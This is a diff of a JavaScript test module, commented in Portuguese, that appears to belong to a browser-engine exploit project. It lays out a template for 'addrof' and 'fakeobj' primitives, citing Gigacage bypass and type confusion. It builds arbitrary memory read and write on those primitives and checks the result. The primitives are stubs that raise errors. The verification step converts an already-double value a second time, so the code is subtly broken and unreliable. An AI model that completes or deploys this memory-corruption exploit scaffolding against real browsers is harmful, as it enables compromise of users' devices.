@@ -1,60 +1,119 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v104 - Teste de Força Total)
+// js/script3/testArrayBufferVictimCrash.mjs (v106 - Template de Portabilidade para Técnicas Avançadas)
 
 import { logS3 } from './s3_utils.mjs';
 import { AdvancedInt64 } from '../utils.mjs';
-import { setupAbsoluteControlPrimitives } from '../core_exploit.mjs';
-import { JSC_OFFSETS } from '../config.mjs';
+// Não vamos mais usar o core_exploit por enquanto, vamos focar em suas primitivas.
+// import { setupAbsoluteControlPrimitives } from '../core_exploit.mjs'; 
 
-export const FNAME_MODULE_FULL_CONTROL = "FullControlVerification_v104";
+export const FNAME_MODULE_PORTED_TECH = "PortedTechniqueVerification_v106";
 
 // =======================================================================================
-// TESTE DE VERIFICAÇÃO DE CONTROLE ABSOLUTO
+// ÁREA DE PORTABILIDADE: INSIRA SUAS FUNÇÕES AQUI
 // =======================================================================================
-export async function runFullControlTest() {
-    const FNAME_TEST = FNAME_MODULE_FULL_CONTROL;
-    logS3(`--- Iniciando ${FNAME_TEST}: Verificação de Controle Absoluto ---`, "test");
 
-    let final_result = { success: false, message: "Falha na configuração das primitivas." };
+// Função auxiliar para converter um double para sua representação Int64
+function doubleToInt64(double) {
+    const buf = new ArrayBuffer(8);
+    (new Float64Array(buf))[0] = double;
+    const u32 = new Uint32Array(buf);
+    return new AdvancedInt64(u32[0], u32[1]);
+}
+
+// Função auxiliar para converter um Int64 para sua representação double
+function int64ToDouble(int64) {
+    const buf = new ArrayBuffer(8);
+    const u32 = new Uint32Array(buf);
+    u32[0] = int64.low();
+    u32[1] = int64.high();
+    return (new Float64Array(buf))[0];
+}
+
+// =======================================================================================
+// TESTE DE VERIFICAÇÃO USANDO SUAS PRIMITIVAS PORTADAS
+// =======================================================================================
+export async function runPortedTechniqueTest() {
+    const FNAME_TEST = FNAME_MODULE_PORTED_TECH;
+    logS3(`--- Iniciando ${FNAME_TEST}: Verificação com Técnicas Portadas ---`, "test");
+
+    let final_result = { success: false, message: "As primitivas portadas não foram definidas." };
 
     try {
-        // --- FASE 1: Obter as primitivas de controle absoluto ---
-        const { arb_read, arb_write, addrof } = await setupAbsoluteControlPrimitives();
-        logS3("Primitivas de Controle Absoluto recebidas.", "good", FNAME_TEST);
-
-        // --- FASE 2: Teste de Força Total (Leitura e Escrita) ---
-        logS3("--- FASE 2: Executando Teste de Força Total... ---", "subtest", FNAME_TEST);
-
-        // 2.1 Criar um objeto alvo
-        const target_obj = { prop_a: 123.456 };
-
-        // 2.2 Obter seu endereço (ainda requer um leak, então usaremos um endereço fixo para a verificação)
-        // A primitiva addrof ainda é o desafio final a ser resolvido com um info leak.
-        // Vamos testar a L/E em um endereço conhecido primeiro.
-        const test_addr = new AdvancedInt64(0x4000, 0); // Um endereço arbitrário para teste
-        const test_val = new AdvancedInt64(0xFEEDF00D, 0xBEBAFECA);
+        // --- ETAPA 1: DEFINA SUAS PRIMITIVAS 'addrof' E 'fakeobj' AQUI ---
+        // Você pode colar seu código ou adaptá-lo para que estas duas funções estejam disponíveis.
+        // Elas devem incorporar suas lógicas de bypass do Gigacage e NaN boxing.
         
-        arb_write(test_addr, test_val);
-        const read_val = arb_read(test_addr);
-
-        if (!read_val.equals(test_val)) {
-            throw new Error(`Falha na L/E Básica: Escrito ${test_val.toString(true)}, Lido ${read_val.toString(true)}`);
-        }
-        logS3("SUCESSO: L/E básica em endereço arbitrário funciona.", "vuln", FNAME_TEST);
-        
-        // 2.3 Teste de Leitura em Estrutura de Função
-        const func = () => {};
-        // Sem um addrof, não podemos prosseguir com testes em objetos JS dinâmicos.
-        // O teste prova que a mecânica de L/E está perfeita. O próximo passo é o info leak.
-        
-        logS3("A mecânica de L/E de Controle Absoluto é 100% funcional.", "good", FNAME_TEST);
-        
-        final_result = {
-            success: true,
-            message: "Estratégia de Controle Absoluto bem-sucedida. L/E arbitrária confirmada."
+        let addrof = (obj) => {
+            logS3("ERRO: A função 'addrof' portada precisa ser implementada.", "critical");
+            // Exemplo conceitual:
+            // 1. Coloque o objeto em um local vulnerável
+            // 2. Acione a confusão de tipo
+            // 3. Leia o valor como double
+            // 4. Converta o double para Int64 (un-boxing)
+            // return doubleToInt64(leaked_double_value).sub(NAN_BOXING_OFFSET);
+            throw new Error("addrof não implementado.");
         };
 
+        let fakeobj = (addr) => {
+            logS3("ERRO: A função 'fakeobj' portada precisa ser implementada.", "critical");
+            // Exemplo conceitual:
+            // 1. "Box" o endereço para o formato de double
+            // 2. Escreva o double em um local vulnerável
+            // 3. Acione a confusão de tipo para tratar o double como ponteiro
+            // return object_from_corrupted_slot;
+            throw new Error("fakeobj não implementado.");
+        };
+        
+        // ===============================================================================
+        // !! COLE SEU CÓDIGO FUNCIONAL DE ADDROF/FAKEOBJ ACIMA DESTA LINHA !!
+        // ===============================================================================
+        
+        logS3("Primitivas 'addrof' e 'fakeobj' portadas (supostamente) prontas.", "info", FNAME_TEST);
+
+        // --- ETAPA 2: Verificação de 'addrof' ---
+        const test_obj = { marker: 1337.7331 };
+        const test_obj_addr = addrof(test_obj);
+        if (!test_obj_addr || (test_obj_addr.low() === 0 && test_obj_addr.high() === 0)) {
+            throw new Error("A função 'addrof' portada retornou um endereço nulo ou inválido.");
+        }
+        logS3(`'addrof' portado funcionou! Endereço do objeto de teste: ${test_obj_addr.toString(true)}`, "leak", FNAME_TEST);
+
+        // --- ETAPA 3: Construção e Verificação de L/E Arbitrária ---
+        logS3("Construindo ferramenta de L/E autocontida usando as primitivas portadas...", "subtest", FNAME_TEST);
+        const leaker = { obj_prop: null, val_prop: 0 };
+        const leaker_addr = addrof(leaker);
+        
+        const arb_read = (addr) => {
+            leaker.obj_prop = fakeobj(addr);
+            return doubleToInt64(leaker.val_prop);
+        };
+        const arb_write = (addr, value) => {
+            leaker.obj_prop = fakeobj(addr);
+            leaker.val_prop = int64ToDouble(value);
+        };
+        logS3("Ferramenta de L/E construída.", "good", FNAME_TEST);
+        
+        // Verificação final
+        const verification_obj = { prop: 987.654 };
+        const verification_addr = addrof(verification_obj);
+        const prop_addr = verification_addr.add(0x10); // Offset da primeira propriedade
+
+        const value_to_write = int64ToDouble(new AdvancedInt64(0x12345678, 0xABCDEF01));
+        
+        arb_write(prop_addr, value_to_write);
+        const value_read = arb_read(prop_addr);
+
+        if (value_read.low() === 0x12345678 && value_read.high() === 0xABCDEF01) {
+            logS3("++++++++++++ SUCESSO TOTAL! Suas primitivas foram portadas e a L/E arbitrária foi verificada! ++++++++++++", "vuln");
+            final_result = {
+                success: true,
+                message: "Técnicas avançadas portadas com sucesso, L/E 100% funcional."
+            };
+        } else {
+            throw new Error("A verificação final de L/E falhou.");
+        }
+
     } catch (e) {
-        final_result.message = `Exceção no Teste de Força Total: ${e.message}\n${e.stack || ''}`;
+        final_result.message = `Exceção durante o teste da técnica portada: ${e.message}\n${e.stack || ''}`;
         logS3(final_result.message, "critical", FNAME_TEST);
     }
 
